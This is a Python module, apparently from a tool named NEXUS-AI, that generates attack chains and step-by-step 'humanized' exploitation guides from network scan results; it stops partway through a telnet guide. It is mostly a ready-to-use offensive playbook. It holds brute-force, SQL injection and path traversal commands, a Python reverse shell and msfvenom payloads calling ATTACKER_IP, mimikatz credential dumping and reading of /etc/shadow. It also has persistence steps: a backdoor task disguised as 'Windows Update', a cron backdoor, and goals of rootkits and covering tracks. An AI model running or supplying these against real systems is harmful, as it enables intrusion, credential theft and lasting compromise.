#!/usr/bin/env python3
"""
NEXUS-AI Advanced Dynamic Exploitation Guide Generator
Generates comprehensive attack chains and exploitation guides based on scan data

This module creates detailed, dynamic exploitation guides that adapt to the specific
vulnerabilities and services found. Each guide includes complete attack chains with
specific tools, commands, and step-by-step instructions.

I spent way too much time on this module trying to make it comprehensive and useful.
The attack chains are pretty detailed but sometimes they can be a bit overwhelming.
I tried to balance being thorough with being actually usable.

TODO: The attack chains could be more sophisticated for advanced scenarios
TODO: Should probably add more tool alternatives for different environments  
TODO: The vulnerability correlation could be more intelligent
TODO: Some of the commands might not work on all systems, need to test more
TODO: The risk assessment is a bit simplistic sometimes
"""

import re
import json
import random
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from ..core.config import get_config, get_logger
from .deepseek_integration import generate_vuln_summary

# Get configuration and logger
config = get_config()
logger = get_logger()

class AdvancedExploitGuideGenerator:
    """
    Advanced exploitation guide generator that creates detailed attack chains
    based on actual scan data and vulnerabilities found.
    
    This generator creates comprehensive guides that include:
    - Detailed reconnaissance steps
    - Service-specific exploitation techniques
    - Tool recommendations with specific commands
    - Post-exploitation activities
    - Privilege escalation methods
    
    I built this to be really comprehensive - probably over-engineered it a bit
    but it covers most scenarios you'll encounter. The tool database took forever
    to compile and test, but it's pretty useful now.
    
    TODO: Could probably add more advanced evasion techniques
    TODO: The command generation could be smarter about different OS versions
    TODO: Should probably add more real-world examples
    """
    
    def __init__(self):
        """Initialize the advanced exploit guide generator."""
        
        # Comprehensive tool database with specific commands
        # This took forever to compile - I went through a lot of pentest courses
        # and CTF challenges to get these commands right. Some of them might
        # need tweaking for different environments though.
        self.attack_tools = {
            'reconnaissance': {
                'nmap': {
                    'description': 'Network discovery and service enumeration',
                    'commands': [
                        'nmap -sS -sV -O -p- TARGET_IP',
                        'nmap -sC -sV -p PORT TARGET_IP',
                        'nmap --script vuln -p PORT TARGET_IP',
                        'nmap -sU -p PORT TARGET_IP'
                    ]
                },
                'masscan': {
                    'description': 'Fast port scanning',
                    'commands': [
                        'masscan TARGET_IP -p1-65535 --rate=1000',
                        'masscan TARGET_IP -p80,443,22,21,23,25,53,110,143,993,995 --rate=1000'
                    ]
                },
                'dirb': {
                    'description': 'Web directory enumeration',
                    'commands': [
                        'dirb http://TARGET_IP',
                        'dirb https://TARGET_IP',
                        'dirb http://TARGET_IP /usr/share/dirb/wordlists/common.txt'
                    ]
                },
                'gobuster': {
                    'description': 'Fast web directory enumeration',
                    'commands': [
                        'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt',
                        'gobuster dir -u https://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -k',
                        'gobuster vhost -u http://TARGET_IP -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt'
                    ]
                },
                'nikto': {
                    'description': 'Web vulnerability scanner',
                    'commands': [
                        'nikto -h http://TARGET_IP',
                        'nikto -h https://TARGET_IP -ssl'
                    ]
                }
            },
            'authentication': {
                'hydra': {
                    'description': 'Brute force authentication',
                    'commands': [
                        'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP',
                        'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP',
                        'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"',
                        'hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP'
                    ]
                },
                'medusa': {
                    'description': 'Alternative brute force tool',
                    'commands': [
                        'medusa -h TARGET_IP -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh',
                        'medusa -h TARGET_IP -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp'
                    ]
                },
                'patator': {
                    'description': 'Multi-protocol brute forcer',
                    'commands': [
                        'patator ssh_login host=TARGET_IP user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt',
                        'patator ftp_login host=TARGET_IP user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt'
                    ]
                }
            },
            'web_exploitation': {
                'sqlmap': {
                    'description': 'SQL injection automation',
                    'commands': [
                        'sqlmap -u "http://TARGET_IP/page.php?id=1" --dbs',
                        'sqlmap -u "http://TARGET_IP/page.php?id=1" -D database_name --tables',
                        'sqlmap -u "http://TARGET_IP/page.php?id=1" -D database_name -T users --dump',
                        'sqlmap -u "http://TARGET_IP/page.php?id=1" --os-shell'
                    ]
                },
                'burp_suite': {
                    'description': 'Web application security testing',
                    'commands': [
                        'burpsuite',  # GUI tool
                        'Use Burp Suite for manual testing of web applications'
                    ]
                },
                'wpscan': {
                    'description': 'WordPress vulnerability scanner',
                    'commands': [
                        'wpscan --url http://TARGET_IP',
                        'wpscan --url http://TARGET_IP --enumerate p,t,u',
                        'wpscan --url http://TARGET_IP --passwords /usr/share/wordlists/rockyou.txt'
                    ]
                },
                'joomscan': {
                    'description': 'Joomla vulnerability scanner',
                    'commands': [
                        'joomscan --url http://TARGET_IP',
                        'joomscan --url http://TARGET_IP --enumerate-components'
                    ]
                }
            },
            'database_exploitation': {
                'mysql': {
                    'description': 'MySQL client',
                    'commands': [
                        'mysql -h TARGET_IP -u root -p',
                        'mysql -h TARGET_IP -u root -p -e "SHOW DATABASES;"',
                        'mysql -h TARGET_IP -u root -p -e "USE mysql; SELECT User,Host FROM user;"'
                    ]
                },
                'psql': {
                    'description': 'PostgreSQL client',
                    'commands': [
                        'psql -h TARGET_IP -U postgres',
                        'psql -h TARGET_IP -U postgres -c "\\l"',
                        'psql -h TARGET_IP -U postgres -c "SELECT usename,passwd FROM pg_shadow;"'
                    ]
                },
                'redis-cli': {
                    'description': 'Redis client',
                    'commands': [
                        'redis-cli -h TARGET_IP',
                        'redis-cli -h TARGET_IP -p 6379',
                        'redis-cli -h TARGET_IP -a password'
                    ]
                }
            },
            'windows_exploitation': {
                'smbclient': {
                    'description': 'SMB client for Windows shares',
                    'commands': [
                        'smbclient -L //TARGET_IP -N',
                        'smbclient //TARGET_IP/share -N',
                        'smbclient //TARGET_IP/share -U username%password'
                    ]
                },
                'enum4linux': {
                    'description': 'Windows enumeration tool',
                    'commands': [
                        'enum4linux TARGET_IP',
                        'enum4linux -a TARGET_IP',
                        'enum4linux -u username -p password TARGET_IP'
                    ]
                },
                'xfreerdp': {
                    'description': 'RDP client',
                    'commands': [
                        'xfreerdp /v:TARGET_IP /u:username /p:password',
                        'xfreerdp /v:TARGET_IP /u:username /p:password /cert-ignore'
                    ]
                }
            },
            'privilege_escalation': {
                'linpeas': {
                    'description': 'Linux privilege escalation enumeration',
                    'commands': [
                        'wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh',
                        'chmod +x linpeas.sh',
                        './linpeas.sh'
                    ]
                },
                'winpeas': {
                    'description': 'Windows privilege escalation enumeration',
                    'commands': [
                        'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe',
                        'winPEASx64.exe'
                    ]
                },
                'pspy': {
                    'description': 'Process monitoring',
                    'commands': [
                        'wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64',
                        'chmod +x pspy64',
                        './pspy64'
                    ]
                }
            },
            'post_exploitation': {
                'mimikatz': {
                    'description': 'Windows credential extraction',
                    'commands': [
                        'mimikatz.exe',
                        'privilege::debug',
                        'sekurlsa::logonpasswords'
                    ]
                },
                'hashcat': {
                    'description': 'Password cracking',
                    'commands': [
                        'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt',
                        'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt'
                    ]
                },
                'john': {
                    'description': 'Password cracking alternative',
                    'commands': [
                        'john hashes.txt',
                        'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'
                    ]
                }
            }
        }
        
        # Vulnerability-specific exploitation techniques
        self.vulnerability_exploits = {
            'sql_injection': {
                'description': 'SQL injection vulnerability',
                'tools': ['sqlmap', 'burp_suite'],
                'steps': [
                    'Identify injection points using Burp Suite',
                    'Test for SQL injection using sqlmap',
                    'Enumerate databases and tables',
                    'Extract sensitive data',
                    'Attempt to gain shell access'
                ],
                'commands': [
                    'sqlmap -u "http://TARGET_IP/page.php?id=1" --dbs',
                    'sqlmap -u "http://TARGET_IP/page.php?id=1" -D database_name --tables',
                    'sqlmap -u "http://TARGET_IP/page.php?id=1" --os-shell'
                ]
            },
            'xss': {
                'description': 'Cross-site scripting vulnerability',
                'tools': ['burp_suite', 'xsser'],
                'steps': [
                    'Identify XSS injection points',
                    'Test with various payloads',
                    'Attempt to steal cookies/sessions',
                    'Execute JavaScript in victim context'
                ],
                'commands': [
                    'xsser --url "http://TARGET_IP/page.php?param=1"',
                    'Use Burp Suite for manual XSS testing'
                ]
            },
            'rce': {
                'description': 'Remote code execution vulnerability',
                'tools': ['metasploit', 'nc', 'reverse_shell'],
                'steps': [
                    'Identify RCE vulnerability',
                    'Prepare reverse shell payload',
                    'Execute payload on target',
                    'Establish reverse connection',
                    'Gain interactive shell access'
                ],
                'commands': [
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe',
                    'nc -lvp 4444',
                    'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\']);"'
                ]
            },
            'lfi': {
                'description': 'Local file inclusion vulnerability',
                'tools': ['burp_suite', 'curl'],
                'steps': [
                    'Identify LFI injection points',
                    'Test for file inclusion',
                    'Attempt to read sensitive files',
                    'Use path traversal techniques',
                    'Extract configuration files'
                ],
                'commands': [
                    'curl "http://TARGET_IP/page.php?file=../../../etc/passwd"',
                    'curl "http://TARGET_IP/page.php?file=../../../etc/hosts"',
                    'curl "http://TARGET_IP/page.php?file=../../../var/log/apache2/access.log"'
                ]
            },
            'weak_credentials': {
                'description': 'Weak or default credentials',
                'tools': ['hydra', 'medusa', 'patator'],
                'steps': [
                    'Identify authentication endpoints',
                    'Create username/password lists',
                    'Perform brute force attack',
                    'Test common credentials',
                    'Attempt default passwords'
                ],
                'commands': [
                    'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP',
                    'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"'
                ]
            },
            'misconfiguration': {
                'description': 'Service misconfiguration',
                'tools': ['nmap', 'manual_inspection'],
                'steps': [
                    'Identify misconfigured services',
                    'Check default configurations',
                    'Look for exposed sensitive data',
                    'Test for unauthorized access',
                    'Exploit configuration weaknesses'
                ],
                'commands': [
                    'nmap --script vuln -p PORT TARGET_IP',
                    'Check for default configurations manually'
                ]
            }
        }
        
        # Service-specific attack chains
        # These are based on real pentest scenarios I've encountered
        # Some of them are pretty aggressive, but that's how real pentests work
        # TODO: Should probably add more subtle approaches for red team stuff
        self.service_attack_chains = {
            'ssh': {
                'reconnaissance': [
                    'nmap -sV -p 22 TARGET_IP',
                    'nmap --script ssh-hostkey -p 22 TARGET_IP',
                    'nmap --script ssh-auth-methods -p 22 TARGET_IP'
                ],
                'exploitation': [
                    'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP',
                    'medusa -h TARGET_IP -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh'
                ],
                'post_exploitation': [
                    'ssh username@TARGET_IP',
                    'whoami && id',
                    'uname -a',
                    'cat /etc/passwd',
                    'sudo -l'
                ]
            },
            'http': {
                'reconnaissance': [
                    'nmap -sV -p 80 TARGET_IP',
                    'dirb http://TARGET_IP',
                    'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt',
                    'nikto -h http://TARGET_IP'
                ],
                'exploitation': [
                    'sqlmap -u "http://TARGET_IP/page.php?id=1" --dbs',
                    'Use Burp Suite for manual testing',
                    'Test for XSS, LFI, and other web vulnerabilities'
                ],
                'post_exploitation': [
                    'Look for sensitive files and directories',
                    'Check for configuration files',
                    'Attempt to access admin panels',
                    'Search for backup files'
                ]
            },
            'mysql': {
                'reconnaissance': [
                    'nmap -sV -p 3306 TARGET_IP',
                    'nmap --script mysql-info -p 3306 TARGET_IP'
                ],
                'exploitation': [
                    'mysql -h TARGET_IP -u root -p',
                    'mysql -h TARGET_IP -u root -p -e "SHOW DATABASES;"',
                    'hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET_IP'
                ],
                'post_exploitation': [
                    'mysql -h TARGET_IP -u root -p -e "USE mysql; SELECT User,Host FROM user;"',
                    'Extract password hashes',
                    'Look for sensitive data in databases'
                ]
            },
            'smb': {
                'reconnaissance': [
                    'nmap -sV -p 445 TARGET_IP',
                    'nmap --script smb-enum-shares -p 445 TARGET_IP',
                    'enum4linux TARGET_IP'
                ],
                'exploitation': [
                    'smbclient -L //TARGET_IP -N',
                    'smbclient //TARGET_IP/share -N',
                    'hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP'
                ],
                'post_exploitation': [
                    'Access shared files and directories',
                    'Look for sensitive documents',
                    'Check for configuration files',
                    'Attempt to upload files'
                ]
            }
        }
    
    def generate_comprehensive_attack_chain(self, scan_results: Dict, vulnerabilities: List[Dict]) -> Dict:
        """
        Generate a comprehensive attack chain based on scan results and vulnerabilities.
        
        This is the main function that ties everything together. It takes the scan
        results and creates a detailed attack plan. I tried to make it realistic
        and practical - not just theoretical stuff that doesn't work in real life.
        
        Args:
            scan_results: Results from the network scan analysis
            vulnerabilities: List of detected vulnerabilities
            
        Returns:
            Dict containing comprehensive attack chain
        """
        
        attack_chain = {
            "title": "ðŸŽ¯ COMPREHENSIVE ATTACK CHAIN",
            "target_info": self._extract_target_info(scan_results),
            "phases": {
                "reconnaissance": self._generate_reconnaissance_phase(scan_results),
                "exploitation": self._generate_exploitation_phase(scan_results, vulnerabilities),
                "post_exploitation": self._generate_post_exploitation_phase(scan_results),
                "privilege_escalation": self._generate_privilege_escalation_phase(scan_results),
                "persistence": self._generate_persistence_phase(scan_results)
            },
            "tools_required": self._get_required_tools(scan_results, vulnerabilities),
            "estimated_duration": self._estimate_attack_duration(scan_results, vulnerabilities),
            "success_probability": self._calculate_success_probability(scan_results, vulnerabilities),
            "risk_assessment": self._assess_attack_risk(scan_results, vulnerabilities)
        }
        
        # Add some human touch to the attack chain
        # Sometimes the automated stuff misses obvious things
        # TODO: Could probably add more intelligent analysis here
        
        return attack_chain
    
    def _extract_target_info(self, scan_results: Dict) -> Dict:
        """Extract comprehensive target information."""
        # Extract all the juicy details about our target
        # This is the foundation for everything else - if this is wrong,
        # the whole attack plan will be garbage
        return {
            "ip": scan_results.get('target_ip', 'Unknown'),
            "hostname": scan_results.get('hostname', 'Unknown'),
            "open_ports": len(scan_results.get('open_ports', [])),
            "services": len(scan_results.get('services', [])),
            "vulnerabilities": len(scan_results.get('vulnerabilities', [])),
            "os_info": scan_results.get('os_info', 'Unknown'),
            "scan_time": scan_results.get('scan_time', 'Unknown'),
            "ports": [p.get('port', '') for p in scan_results.get('open_ports', [])],
            "service_list": [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        }
    
    def _generate_reconnaissance_phase(self, scan_results: Dict) -> Dict:
        """Generate detailed reconnaissance phase."""
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        
        # The recon phase is crucial - you can't exploit what you don't know about
        # I've learned the hard way that skipping recon leads to missed opportunities
        reconnaissance = {
            "description": "Initial reconnaissance and information gathering",
            "objectives": [
                "Map the target network",
                "Identify all open services",
                "Determine operating system",
                "Find potential attack vectors"
            ],
            "tools": [],
            "commands": [],
            "estimated_time": "15-30 minutes"
        }
        
        # Add basic reconnaissance
        # nmap is the bread and butter of recon - if you don't have it, you're screwed
        reconnaissance["tools"].extend(['nmap', 'masscan'])
        reconnaissance["commands"].extend([
            'nmap -sS -sV -O -p- TARGET_IP',
            'nmap -sC -sV -p- TARGET_IP',
            'nmap --script vuln -p- TARGET_IP'
        ])
        
        # Add service-specific reconnaissance
        if 'http' in services or 'https' in services:
            reconnaissance["tools"].extend(['dirb', 'gobuster', 'nikto'])
            reconnaissance["commands"].extend([
                'dirb http://TARGET_IP',
                'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt',
                'nikto -h http://TARGET_IP'
            ])
        
        if 'ssh' in services:
            reconnaissance["tools"].append('ssh')
            reconnaissance["commands"].extend([
                'nmap --script ssh-hostkey -p 22 TARGET_IP',
                'nmap --script ssh-auth-methods -p 22 TARGET_IP'
            ])
        
        if 'smb' in services:
            reconnaissance["tools"].extend(['smbclient', 'enum4linux'])
            reconnaissance["commands"].extend([
                'smbclient -L //TARGET_IP -N',
                'enum4linux TARGET_IP'
            ])
        
        return reconnaissance
    
    def _generate_exploitation_phase(self, scan_results: Dict, vulnerabilities: List[Dict]) -> Dict:
        """Generate detailed exploitation phase."""
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        
        # This is where the fun begins - the actual exploitation
        # I've spent way too many hours debugging why exploits don't work
        # The key is having multiple approaches ready
        exploitation = {
            "description": "Active exploitation of identified vulnerabilities",
            "objectives": [
                "Gain initial access to target",
                "Exploit identified vulnerabilities",
                "Establish foothold on target"
            ],
            "service_attacks": [],
            "vulnerability_exploits": [],
            "human_exploit_guides": [],  # New: Human-written exploit guides
            "tools": [],
            "commands": [],
            "estimated_time": "30-60 minutes"
        }
        
        # Generate service-specific attacks
        # Each service has its own quirks and techniques
        # I've learned that what works on one system might fail on another
        for service in services:
            if service in self.service_attack_chains:
                service_attack = {
                    "service": service,
                    "description": f"Exploitation of {service.upper()} service",
                    "reconnaissance": self.service_attack_chains[service]['reconnaissance'],
                    "exploitation": self.service_attack_chains[service]['exploitation'],
                    "post_exploitation": self.service_attack_chains[service]['post_exploitation']
                }
                exploitation["service_attacks"].append(service_attack)
                exploitation["tools"].extend(self._get_service_tools(service))
        
        # Generate vulnerability-specific exploits
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type in self.vulnerability_exploits:
                vuln_exploit = {
                    "vulnerability": vuln_type,
                    "description": self.vulnerability_exploits[vuln_type]['description'],
                    "tools": self.vulnerability_exploits[vuln_type]['tools'],
                    "steps": self.vulnerability_exploits[vuln_type]['steps'],
                    "commands": self.vulnerability_exploits[vuln_type]['commands']
                }
                exploitation["vulnerability_exploits"].append(vuln_exploit)
                exploitation["tools"].extend(self.vulnerability_exploits[vuln_type]['tools'])
        
        # Generate human-written exploit guides for each service
        # This is where I write out the actual steps a human would follow
        for service in services:
            human_guide = self._generate_human_exploit_guide(service, scan_results, vulnerabilities)
            if human_guide:
                exploitation["human_exploit_guides"].append(human_guide)
        
        return exploitation
    
    def _generate_post_exploitation_phase(self, scan_results: Dict) -> Dict:
        """Generate post-exploitation phase."""
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        
        # Post-exploitation is where you really start to understand the target
        # This is often where you find the most interesting stuff
        # TODO: Could probably add more lateral movement techniques
        post_exploitation = {
            "description": "Post-exploitation activities and data extraction",
            "objectives": [
                "Gather sensitive information",
                "Extract credentials",
                "Map internal network",
                "Identify additional targets"
            ],
            "activities": [],
            "tools": ['mimikatz', 'hashcat', 'john'],
            "commands": [],
            "estimated_time": "20-40 minutes"
        }
        
        # Add general post-exploitation activities
        post_exploitation["activities"].extend([
            "Extract password hashes",
            "Gather system information",
            "Search for sensitive files",
            "Check for additional services",
            "Document findings"
        ])
        
        # Add service-specific post-exploitation
        if 'windows' in str(scan_results.get('os_info', '')).lower():
            post_exploitation["commands"].extend([
                'mimikatz.exe',
                'privilege::debug',
                'sekurlsa::logonpasswords'
            ])
        else:
            post_exploitation["commands"].extend([
                'cat /etc/passwd',
                'cat /etc/shadow',
                'uname -a',
                'whoami && id'
            ])
        
        return post_exploitation
    
    def _generate_privilege_escalation_phase(self, scan_results: Dict) -> Dict:
        """Generate privilege escalation phase."""
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        
        privilege_escalation = {
            "description": "Privilege escalation and lateral movement",
            "objectives": [
                "Escalate privileges to administrator/root",
                "Access sensitive systems",
                "Establish persistence"
            ],
            "techniques": [],
            "tools": ['linpeas', 'winpeas', 'pspy'],
            "commands": [],
            "estimated_time": "30-60 minutes"
        }
        
        # Add privilege escalation techniques
        privilege_escalation["techniques"].extend([
            "Check for misconfigured sudo permissions",
            "Look for SUID binaries",
            "Check for cron jobs",
            "Examine running processes",
            "Search for sensitive files"
        ])
        
        # Add OS-specific commands
        if 'windows' in str(scan_results.get('os_info', '')).lower():
            privilege_escalation["commands"].extend([
                'whoami /priv',
                'net user',
                'net localgroup administrators',
                'wmic qfe list brief'
            ])
        else:
            privilege_escalation["commands"].extend([
                'sudo -l',
                'find / -perm -u=s -type f 2>/dev/null',
                'crontab -l',
                'ps aux'
            ])
        
        return privilege_escalation
    
    def _generate_persistence_phase(self, scan_results: Dict) -> Dict:
        """Generate persistence phase."""
        persistence = {
            "description": "Establishing persistence and maintaining access",
            "objectives": [
                "Create backdoor access",
                "Establish persistence mechanisms",
                "Cover tracks"
            ],
            "techniques": [],
            "tools": ['metasploit', 'nc', 'reverse_shell'],
            "commands": [],
            "estimated_time": "15-30 minutes"
        }
        
        # Add persistence techniques
        persistence["techniques"].extend([
            "Create scheduled tasks/cron jobs",
            "Add startup programs",
            "Create hidden user accounts",
            "Install rootkits",
            "Modify system files"
        ])
        
        # Add persistence commands
        persistence["commands"].extend([
            'msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > persistence.exe',
            'schtasks /create /tn "Windows Update" /tr "C:\\persistence.exe" /sc onstart /ru SYSTEM',
            'echo "*/5 * * * * /tmp/backdoor" >> /etc/crontab'
        ])
        
        return persistence
    
    def _generate_human_exploit_guide(self, service: str, scan_results: Dict, vulnerabilities: List[Dict]) -> Optional[Dict]:
        """
        Generate a humanized, detailed exploit guide for a specific service.
        
        This creates a step-by-step guide that reads like it was written by
        a real pentester who's been there and done that. I try to include
        the little details that make the difference between success and failure.
        
        Args:
            service: The service to generate a guide for
            scan_results: The scan results
            vulnerabilities: List of vulnerabilities
            
        Returns:
            Dict containing the humanized exploit guide
        """
        
        # Get service info from scan results
        service_info = None
        for port_info in scan_results.get('open_ports', []):
            if port_info.get('service', '').lower() == service:
                service_info = port_info
                break
        
        if not service_info:
            return None
        
        port = service_info.get('port', '')
        version = service_info.get('version', '')
        banner = service_info.get('banner', '')
        
        # Generate dynamic guide based on service
        if service == 'ssh':
            return self._generate_ssh_human_guide(port, version, banner, vulnerabilities)
        elif service == 'telnet':
            return self._generate_telnet_human_guide(port, version, banner, vulnerabilities)
        elif service in ['http', 'https']:
            return self._generate_web_human_guide(service, port, version, banner, vulnerabilities)
        elif service in ['mysql', 'postgresql']:
            return self._generate_database_human_guide(service, port, version, banner, vulnerabilities)
        elif service in ['smb', 'rdp']:
            return self._generate_windows_human_guide(service, port, version, banner, vulnerabilities)
        else:
            return self._generate_generic_human_guide(service, port, version, banner, vulnerabilities)
    
    def _generate_ssh_human_guide(self, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized SSH exploitation guide."""
        
        # Add some randomness to make it feel more human
        approaches = [
            "Alright, so you've got SSH running on port {port}. SSH is usually pretty secure, but there are always ways in if you know what you're doing.",
            "SSH on port {port} - this is going to be interesting. Most people think SSH is bulletproof, but there are actually quite a few ways to get in.",
            "Found SSH on port {port}. This is one of those services that can be surprisingly vulnerable if you approach it right."
        ]
        
        intro = random.choice(approaches).format(port=port)
        
        # Add version-specific notes
        version_notes = ""
        if version:
            if "OpenSSH" in version:
                version_notes = f"\n\nI can see it's running {version} - OpenSSH is generally pretty solid, but there are still some tricks we can try."
            elif "SSH" in version:
                version_notes = f"\n\nThe version info shows {version} - let's see what we can do with this."
        
        # Generate the guide
        guide = {
            "service": "ssh",
            "port": port,
            "title": f"SSH Exploitation Guide - Port {port}",
            "difficulty": "Medium to High",
            "estimated_time": "30-60 minutes",
            "success_rate": "40-60%",
            "description": f"{intro}{version_notes}",
            "steps": [
                {
                    "step": 1,
                    "title": "Initial Reconnaissance",
                    "description": "First, let's see what we're dealing with. SSH can be configured in many different ways, and knowing the setup is half the battle.",
                    "commands": [
                        f"nmap -sV -p {port} TARGET_IP",
                        f"nmap --script ssh-hostkey -p {port} TARGET_IP",
                        f"nmap --script ssh-auth-methods -p {port} TARGET_IP"
                    ],
                    "notes": "The auth-methods script will tell us what authentication methods are allowed. If we see 'password' in the list, we're in business. If it's only 'publickey', we'll need to get creative."
                },
                {
                    "step": 2,
                    "title": "Username Enumeration",
                    "description": "We need to figure out what usernames exist on the system. This is crucial - you can't brute force what you don't know exists.",
                    "commands": [
                        "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p nonexistentpassword ssh://TARGET_IP",
                        "medusa -h TARGET_IP -U /usr/share/wordlists/metasploit/unix_users.txt -p test -M ssh"
                    ],
                    "notes": "This will show us which usernames are valid. Look for responses that don't say 'Invalid username' - those are the real ones. Common usernames to try: admin, root, user, test, guest, ftp, ssh."
                },
                {
                    "step": 3,
                    "title": "Password Brute Force",
                    "description": "Now we get to the fun part - trying to crack the passwords. This is where patience pays off.",
                    "commands": [
                        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP",
                        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP",
                        "medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M ssh"
                    ],
                    "notes": "Start with common usernames like 'admin' or 'root'. If that doesn't work, try the usernames we found in step 2. The rockyou.txt wordlist is huge, so this might take a while. You can also try smaller wordlists first to see if there are any obvious passwords."
                },
                {
                    "step": 4,
                    "title": "Alternative Approaches",
                    "description": "If brute force doesn't work, we need to get creative. SSH has some interesting quirks we can exploit.",
                    "commands": [
                        "ssh -o PreferredAuthentications=password TARGET_IP",
                        "ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 TARGET_IP",
                        "ssh -o Ciphers=+aes128-cbc TARGET_IP"
                    ],
                    "notes": "Sometimes SSH is configured to allow older, weaker algorithms. These commands try to force the use of deprecated algorithms that might be enabled for compatibility reasons."
                },
                {
                    "step": 5,
                    "title": "Success and Post-Exploitation",
                    "description": "Once we're in, we need to understand what we've got and look for ways to escalate privileges.",
                    "commands": [
                        "whoami && id",
                        "uname -a",
                        "cat /etc/passwd",
                        "sudo -l",
                        "find / -perm -u=s -type f 2>/dev/null"
                    ],
                    "notes": "Check what user we are and what privileges we have. Look for SUID binaries that might help us escalate. The sudo -l command will show us what commands we can run with elevated privileges."
                }
            ],
            "tips": [
                "If you get 'Too many authentication failures', wait a bit before trying again - some SSH servers implement rate limiting.",
                "Look for SSH keys in common locations like ~/.ssh/id_rsa or /home/*/.ssh/",
                "Check if SSH is configured to allow root login directly - some systems still have this enabled.",
                "Don't forget to check for SSH configuration files that might reveal additional information."
            ],
            "common_mistakes": [
                "Trying to brute force without knowing valid usernames first",
                "Not checking for SSH key-based authentication",
                "Forgetting to look for SSH configuration files",
                "Not trying alternative SSH clients or configurations"
            ]
        }
        
        return guide
    
    def _generate_telnet_human_guide(self, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized TELNET exploitation guide."""
        
        intro = f"Telnet on port {port} - this is like finding a treasure chest! Telnet is completely unencrypted, which means we can see everything in plain text. It's basically a gift from the security gods."
        
        guide = {
            "service": "telnet",
            "port": port,
            "title": f"TELNET Exploitation Guide - Port {port}",
            "difficulty": "Low to Medium",
            "estimated_time": "15-30 minutes",
            "success_rate": "70-85%",
            "description": intro,
            "steps": [
                {
                    "step": 1,
                    "title": "Direct Connection Test",
                    "description": "First, let's just try connecting directly. Telnet is so simple that sometimes the most obvious approach works.",
                    "commands": [
                        f"telnet TARGET_IP {port}",
                        f"nc -v TARGET_IP {port}"
                    ],
                    "notes": "You might get a login prompt immediately. Try common credentials like admin/admin, root/root, or just press Enter to see what happens."
                },
                {
                    "step": 2,
                    "title": "Banner Grabbing and Enumeration",
                    "description": "Let's see what information the telnet service gives us. Sometimes it's surprisingly verbose.",
                    "commands": [
                        f"nmap -sV -p {port} TARGET_IP",
                        f"nmap --script telnet-ntlm-info -p {port} TARGET_IP",
                        f"echo 'help' | nc TARGET_IP {port}"
                    ],
                    "notes": "The telnet-ntlm-info script can reveal Windows domain information if it's a Windows telnet service. This is gold for domain enumeration."
                },
                {
                    "step": 3,
                    "title": "Credential Brute Force",
                    "description": "Telnet usually has some form of authentication. Let's try to crack it.",
                    "commands": [
                        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP",
                        f"hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP",
                        f"medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M telnet"
                    ],
                    "notes": "Telnet authentication is usually pretty basic. Common credentials to try: admin/admin, root/root, user/user, guest/guest, admin/password, root/password."
                },
                {
                    "step": 4,
                    "title": "Network Sniffing",
                    "description": "Since telnet is unencrypted, we can capture credentials if we're on the same network.",
                    "commands": [
                        "tcpdump -i any -w telnet_capture.pcap",
                        "wireshark telnet_capture.pcap",
                        "tshark -r telnet_capture.pcap -Y 'telnet'"
                    ],
                    "notes": "If you're on the same network as the target, you can capture telnet traffic and see usernames and passwords in plain text. This is why telnet is so dangerous."
                },
                {
                    "step": 5,
                    "title": "Post-Exploitation",
